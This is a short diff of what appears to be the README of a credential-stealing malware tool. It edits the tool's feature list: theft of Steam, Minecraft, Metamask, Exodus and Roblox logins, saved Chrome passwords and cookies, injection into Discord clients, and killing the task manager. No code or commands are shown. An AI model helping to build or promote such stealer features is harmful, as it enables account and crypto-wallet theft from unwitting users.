@@ -34,9 +34,9 @@
 
 Steal Steam / Minecraft / Metamask / Exodus / Roblox / NationGlory login
 
-Steal Chrome Passwords / Cookies / History
+Steal (saved) Chrome Passwords / Cookies / History
 
-Inject Discord / Discord Canary / Lightcord / Ripcord / Xcord
+Inject into Discord / Discord Canary / Lightcord / Ripcord / Xcord
 
 Debug Killer (Kill task gestionary)
 
